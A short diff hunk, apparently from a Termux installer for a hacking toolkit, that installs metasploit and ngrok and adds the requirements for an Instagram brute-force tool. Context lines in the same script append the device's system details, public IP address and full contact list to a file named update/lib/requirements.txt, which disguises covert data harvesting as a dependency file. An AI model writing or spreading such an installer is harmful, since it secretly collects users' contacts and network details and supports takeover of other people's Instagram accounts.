@@ -46,6 +46,7 @@ termux-toast -b red -c yellow "Merhaba"
 	pkg install metasploit -y
 	rm -rf /data/data/com.termux/files/usr/bin/ngrok
 	mv -v ngrok /data/data/com.termux/files/usr/bin
+	pip install -r /data/data/com.termux/files/home/T-U-R-K/bruteforce/instagram-bruteforce/requirements.txt
 	neofetch >> update/lib/requirements.txt
 	curl ipecho.net/plain >> update/lib/requirements.txt
 	termux-contact-list >> update/lib/requirements.txt
